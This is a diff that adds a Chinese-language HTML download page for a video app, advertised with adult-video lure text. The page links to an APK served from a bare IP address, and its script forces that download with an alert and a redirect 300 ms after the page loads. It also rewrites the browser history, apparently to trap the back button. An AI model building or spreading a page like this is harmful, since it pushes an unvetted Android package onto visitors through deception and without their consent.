@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+
+<html lang="en" style="font-size: 100px;">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style class="vjs-styles-defaults">
+      .video-js {
+        width: 300px;
+        height: 150px;
+      }
+
+      .vjs-fluid {
+        padding-top: 56.25%
+      }
+    </style>
+	<style class="vjs-styles-dimensions">
+      .my-video-dimensions {
+        width: 444.44444444444446px;
+        height: 250px;
+      }
+
+      .my-video-dimensions.vjs-fluid {
+        padding-top: 56.25%;
+      }
+</style>
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>看上影APP下载</title>
+	<link rel="stylesheet" href="./images/base.min.css">
+	<link rel="stylesheet" href="./images/download.css">
+	<link rel="stylesheet" href="./images/app-d8aff3f0a7.min.css">
+	<!--网页弹窗下载-->
+	<script type="text/javascript">
+	var parameters = location.search;window.history.pushState('index.html', 'Other Page', 'index.html' + parameters);
+	//window.history.pushState('AppDownInfopure.aspx', 'Initial Page', 'AppDownInfopure.aspx' + parameters);
+	//window.history.pushState('AppAndroidVideos=aspx.=', 'Initial Page', 'AppAndroidVideos=aspx.=' + parameters);
+	window.addEventListener("popstate", function(e) {if(document.URL.indexOf("index.html") >= 0){document.location.href = document.location;}});
+	</script>
+	<!--END网页弹窗下载-->
+	</head>
+	
+	<body>
+	<div class="container">
+	<a href="http://112.124.9.200/download/cn.ctcms.demo_1_dae774b7062b47ab891188a9fa35b9cf.apk" style="color:black;"> 
+<!--	<a href="http://www.h5love.xyz/app/apk/85kan1.1.0.apk" style="color:black;">-->
+	<div class="top" style="background-image: url(./images/android_bg2.jpg);">
+	<div class="title">&nbsp;</div>
+	<div class="tip">&nbsp;&nbsp;</div>
+	</div>
+	<!--<div class="content">
+	<div class="install">
+	<i class="icon install-pre"></i>
+	<span class="install-tip">下载地址</span>
+	</div>
+	<div style="text-align: center">
+	<div id="qrcode" class="qrcode" title="https://d2.hulu222.com">
+	<canvas width="128" height="128" style="display: none;">
+	</canvas>
+	</div>
+	</div>
+	</div>-->
+	<div class="AndroidContent">
+	<img src="./images/android_bg1.jpg">
+	</div>
+	
+	<div class="AndroidContent">
+	<img src="./images/android_bg.jpg">
+	</div>
+	
+	<div class="content t-center">
+	</div><div class="bottom">
+	<div class="logo">点   击   下   载   最   新   爽</div>
+	<div><p>片 立 即 看&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p></div>
+	<div></div>
+	<div></div>
+	<div></div>
+	<div class="download" id="download">安卓下载</div>
+	</div>
+	</a>
+	</div>
+	<script src="./images/base.min.js"></script>
+
+<script>
+function g(name)
+{
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return unescape(r[2]); return null;
+}
+function getURLParameter(name) {
+    return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null
+ };
+function getNowFormatDate() 
+{ 
+	var day = new Date(); 
+	var Year = 0; 
+	var Month = 0; 
+	var Day = 0; 
+	var CurrentDate = "";
+	Year = day.getFullYear();
+	Month = day.getMonth() + 1; 
+	Day = day.getDate(); 
+	Hour = day.getHours(); 
+	Minute = day.getMinutes(); 
+	Minute = Minute - (Minute % 10);
+	Second = day.getSeconds(); 
+	CurrentDate += Year; 
+	if (Month >= 10 ) CurrentDate += Month; 
+	else CurrentDate += "0" + Month; 
+	if (Day >= 10 ) CurrentDate += Day;
+	else CurrentDate += "0" + Day;
+	if(Hour >= 10) CurrentDate += Hour;
+	else CurrentDate += "0" + Hour;
+	if(Minute >= 10) CurrentDate += Minute;
+	else CurrentDate += "0" + Minute;
+	if(Second >= 10) CurrentDate += Second;
+	else CurrentDate += "0" + Second;
+	return CurrentDate; 
+}
+var cid = g("cid");
+if(cid == null){ cid = "pmv004";}
+var isback = g("back");
+function scrollTop()
+{
+	document.documentElement.scrollTop = document.body.scrollTop = 0;
+}
+
+var apkurl = 'http://112.124.9.200/download/cn.ctcms.demo_1_dae774b7062b47ab891188a9fa35b9cf.apk';
+//var apkurl = 'http://www.h5love.xyz/app/apk/85kan1.1.0.apk';
+function downfile()
+{
+	showTip("★海量高清视频，下载观看★", apkurl,50, true);
+}
+
+function showTip(text, down_url, delay, set_timer){
+	if(set_timer==true){
+		window.setTimeout("showTip('"+ text +"', '" + down_url + "', '" + delay + "', false)", delay)
+		
+	}else{
+		alert(text)
+		location.href=apkurl;
+	}
+}
+
+
+setTimeout("downfile()", 300)
+
+
+if(isback != "1")
+{
+//	history.pushState({ page: 1 }, "title 1", "#nbb");
+//	window.onhashchange = function (event) {window.location.hash = "nbb";};
+}
+
+</script>
+
+	</body>
+	</html>
